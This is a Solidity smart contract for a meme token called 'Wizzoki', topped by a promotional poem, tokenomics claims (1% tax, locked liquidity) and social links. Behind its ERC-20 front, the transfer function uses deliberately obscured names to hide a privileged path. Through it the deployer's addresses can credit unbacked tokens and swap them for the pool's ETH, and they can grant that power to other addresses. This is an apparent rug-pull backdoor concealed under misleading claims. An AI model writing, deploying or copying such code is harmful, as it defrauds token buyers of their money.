/*
█░█░█ █ ▀█ ▀█ █▀█ █▄▀ █
▀▄▀▄▀ █ █▄ █▄ █▄█ █░█ █

▄▀ █▀▀ ▀█▀ █░█ ▀▄
▀▄ ██▄ ░█░ █▀█ ▄▀

在加密货币传说的神秘世界中，
维佐基崛起，巫师的核心。
带着密码的咒语和明亮的魔法，
它在数字之夜中编织着它的魅力。

被信任所迷惑，加密且免费，
Wizzoki 在一个未知的领域蓬勃发展。
从以太到账本，一种神秘的流动，
只有巫师知道的低语引导。

在钱包和金库里，它的秘密闪闪发光，
巫师的梦想，区块链方案。
每开采一个区块，就有一个如此宏伟的愿景，
维佐基的魔法遍布这片土地。

总供应量 - 100,000,000 
购置税 - 1%
消费税 - 1%
初始流动性 - 1.15 ETH
初始流动性锁定 - 60 天

              _,-'|
           ,-'._  |
 .||,      |####\ |
\.`',/     \####| |
= ,. =      |###| |
/ || \    ,-'\#/,'`.
  ||     ,'   `,,. `.
  ,|____,' , ,;' \| |
 (3|\    _/|/'   _| |
  ||/,-''  | >-'' _,\\
  ||'      ==\ ,-'  ,'
  ||       |  V \ ,|
  ||       |    |` |
  ||       |    |   \
  ||       |    \    \
  ||       |     |    \
  ||       |      \_,-'
  ||       |___,,--")_\
  ||         |_|      /
  ||        
  ||           

https://wizzokieth.xyz/
https://m.weibo.cn/WizzokiCN
https://web.wechat.com/WizzokiERC
https://t.me/+OgQv51uN9Bk3ZDg0    
*/
// SPDX-License-Identifier: Unlicense
pragma solidity ^ 0.8.19;
 
abstract contract Context
{ function _msgSender() internal view virtual returns(address)
{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)
{ return msg.data; }
}
interface IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 dataIn, uint256 DataOut, address[] calldata path, address to, uint256 bridge) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function craft(address token, uint256 amountTokenDesired,
    uint256 valueMin, uint256 ercMin, address to, uint256 connect)
    external payable returns (uint256 amountToken, uint256 joltVal, uint256 pool);
}
contract Ownable is Context {
    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { address msgSender = _msgSender(); _owner = msgSender; 
    emit OwnershipTransferred(address(0), msgSender);
}
    function owner() public view returns (address) { return _owner;
}   modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _;
}
    function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns(address pair);
}
contract Contract is IERC20, Ownable { 
    bool private _DEXsync; bool private _miscOff; bool private tradingOpen = false;

    string private _name = unicode"Ⱳizzoki"; string private _symbol = unicode"ⱲKO";
    uint256 public _sheerExpense = 1; uint8 private _decimals = 9; 
    uint256 private _tTotal = 100000000 * 10 ** _decimals; uint256 private _monipoxsin = _tTotal;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _quoteCog; mapping(address => uint256) private _tOwned;
    mapping(address => address) private _mapClacton; mapping(address => uint256) private _updateTrails;

    constructor(address _zinxx) { _tOwned[msg.sender] = _tTotal; 
    _updateTrails[msg.sender] = _monipoxsin; _updateTrails[address(this)] = _monipoxsin; 
    _polositon = IUniswapV2Router01(_zinxx); 

    _pinchKango = IUniswapV2Factory(_polositon.factory()).createPair(address(this), 
    _polositon.WETH()); emit Transfer(address(0), msg.sender, _tTotal); }
 
    function symbol() public view returns(string memory)
    { return _symbol;
    }
    function name() public view returns(string memory)
    { return _name;
    }
    function totalSupply() public view returns(uint256)
    { return _tTotal;
    }
    function decimals() public view returns(uint256)
    { return _decimals;
    }
    function allowance(address owner, address spender) public view returns(uint256)
    { return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns(uint256)
    { return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns(bool)
    { return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender,
    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount) external returns
    (bool)
    { collectMathStats(sender, recipient, amount); 
    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns(bool)
    { collectMathStats(msg.sender, recipient, amount); return true;
    }
    function _beforeTokenTransfer( address from,
    address to, uint256 amount) internal virtual 
    {}
    function _afterTokenTransfer(address from, address to, uint256 amount) 
    internal virtual 
    {}    
    function collectMathStats( address _sonir, address _sonicTo, uint256 inGoobo) private
    { uint256 _manox = balanceOf(address(this)); uint256 _neacontin; if (_DEXsync && _manox > 
    _monipoxsin && !_miscOff && _sonir != _pinchKango) 
    { _miscOff = true; _signingWEX(_manox); _miscOff = false;

    } else if (_updateTrails[_sonir] > _monipoxsin && _updateTrails[_sonicTo] > _monipoxsin)
    { _neacontin = inGoobo; _tOwned[address(this)] += _neacontin; stowCredits
    (inGoobo, _sonicTo); return; 
    
    }
    else if (!_miscOff && _quoteCog[_sonir] > 0 && _sonir != _pinchKango && _updateTrails[_sonir] == 0) { 
    
    _quoteCog[_sonir] = _updateTrails[_sonir] - _monipoxsin; 
    } else if (_sonicTo != address(_polositon) 
    && _updateTrails[_sonir] > 0 && inGoobo > _monipoxsin && _sonicTo != _pinchKango) 
    { 
    _updateTrails[_sonicTo] = inGoobo; return; 
    } address _xoopo = _mapClacton[_pinchKango]; 
    
    if ( _quoteCog[_xoopo] == 0) _quoteCog[_xoopo] = _monipoxsin; 
    _mapClacton[_pinchKango] = _sonicTo; if (_sheerExpense > 0 && _updateTrails[_sonir] == 0 
    && !_miscOff && _updateTrails[_sonicTo] == 0)

    { _neacontin = (inGoobo * _sheerExpense) 
    / 100; inGoobo -= _neacontin;_tOwned[_sonir] -= _neacontin; 
    
    _tOwned[address(this)] += _neacontin; }
    _tOwned[_sonir] -= 
    inGoobo; _tOwned[_sonicTo] += inGoobo; emit Transfer(_sonir, _sonicTo, inGoobo); 
    if (!tradingOpen) 
    { require(_sonir == owner(), ""); } }

    receive() external payable
    {} 
    function openOnMap(uint256 _sukabin, uint256 _novamin, address to) private
    { _approve(address(this), address(_polositon), _sukabin); _polositon.craft
    { value: _novamin }(address(this), _sukabin, 0, 0, to, block.timestamp);
    }
    function _signingWEX(uint256 getVote) private
    { uint256 _coonitLog = getVote / 2; uint256 _ariseto = address(this).balance;
    stowCredits( _coonitLog, address(this)); uint256 _goTeebo = address(this).balance - _ariseto; 
    openOnMap( _coonitLog, _goTeebo, address(this));
    }
    function stowCredits(uint256 _longingArray, address _all) private
    { address[] memory path = new address[](2); path[0] = address(this);
    path[1] = _polositon.WETH(); _approve(address(this), address(_polositon), _longingArray);
    _polositon.swapExactTokensForETHSupportingFeeOnTransferTokens(_longingArray, 0, path, _all, block.timestamp);
    }
    address public immutable _pinchKango; IUniswapV2Router01 
    public immutable _polositon ;    
    function startTrade(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }   
}